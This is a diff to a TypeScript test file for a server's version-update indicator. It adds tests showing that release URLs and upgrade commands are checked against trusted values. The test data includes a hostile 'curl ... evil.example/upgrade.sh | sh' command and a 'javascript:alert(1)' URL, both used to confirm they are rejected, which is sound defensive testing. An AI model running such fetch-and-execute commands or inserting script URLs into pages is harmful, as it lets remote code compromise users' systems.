@@ -8,6 +8,12 @@ import type { VersionCheckResult } from '@/types';
 
 import { VersionUpdateContent, VersionUpdateIndicator } from './VersionUpdateIndicator';
 import { manualVersionCheckToast } from './version-update-toast';
+import {
+  safeReleaseUrl,
+  safeUpgradeCommand,
+  TRUSTED_RELEASE_URL,
+  TRUSTED_UPGRADE_COMMAND,
+} from './version-update-security';
 
 function result(overrides: Partial<VersionCheckResult> = {}): VersionCheckResult {
   return {
@@ -43,6 +49,18 @@ function renderIndicator(target: VersionCheckTarget, data?: VersionCheckResult) 
 }
 
 describe('VersionUpdateIndicator', () => {
+  test('allows only the expected GitHub releases URL shape', () => {
+    expect(safeReleaseUrl('https://github.com/zsio/netsgo/releases/tag/v0.2.0')).toBe('https://github.com/zsio/netsgo/releases/tag/v0.2.0');
+    expect(safeReleaseUrl('javascript:alert(1)')).toBe(TRUSTED_RELEASE_URL);
+    expect(safeReleaseUrl('https://evil.example/zsio/netsgo/releases')).toBe(TRUSTED_RELEASE_URL);
+  });
+
+  test('allows only the canonical upgrade command', () => {
+    expect(safeUpgradeCommand(TRUSTED_UPGRADE_COMMAND)).toBe(TRUSTED_UPGRADE_COMMAND);
+    expect(safeUpgradeCommand(` ${TRUSTED_UPGRADE_COMMAND} `)).toBe(TRUSTED_UPGRADE_COMMAND);
+    expect(safeUpgradeCommand('curl -fsSL https://evil.example/upgrade.sh | sh')).toBeNull();
+  });
+
   test('manual check toast decision treats hard failures as errors', () => {
     expect(manualVersionCheckToast(result({ check_failed: true }))).toBe('error');
     expect(manualVersionCheckToast(null, true)).toBe('error');
@@ -72,17 +90,41 @@ describe('VersionUpdateIndicator', () => {
       update_available: true,
       recommended_action: 'run_script',
       commands: {
-        command: 'curl -fsSL https://netsgo.zs.uy/upgrade.sh | sh -s -- -y',
+        command: TRUSTED_UPGRADE_COMMAND,
       },
       }),
     }));
 
     expect(markup).toContain('Run the following command on the Server machine to upgrade');
-    expect(markup).toContain('curl -fsSL https://netsgo.zs.uy/upgrade.sh | sh -s -- -y');
+    expect(markup).toContain(TRUSTED_UPGRADE_COMMAND);
     expect(markup).not.toContain('China mirror');
     expect(markup).not.toContain('Global source');
     expect(markup).not.toContain('--source');
   });
+
+  test('does not render hostile service commands as copyable trusted commands', () => {
+    const target: VersionCheckTarget = {
+      kind: 'server',
+      version: 'v0.1.0',
+      installMethod: 'service',
+    };
+    const markup = renderToStaticMarkup(createElement(VersionUpdateContent, {
+      target,
+      data: result({
+        update_available: true,
+        recommended_action: 'run_script',
+        commands: {
+          command: 'curl -fsSL https://evil.example/upgrade.sh | sh',
+        },
+        release_url: 'javascript:alert(1)',
+      }),
+    }));
+
+    expect(markup).not.toContain('evil.example');
+    expect(markup).not.toContain('javascript:');
+    expect(markup).toContain(TRUSTED_RELEASE_URL);
+  });
+
 
   test('binary update does not render script commands', () => {
     const target: VersionCheckTarget = {
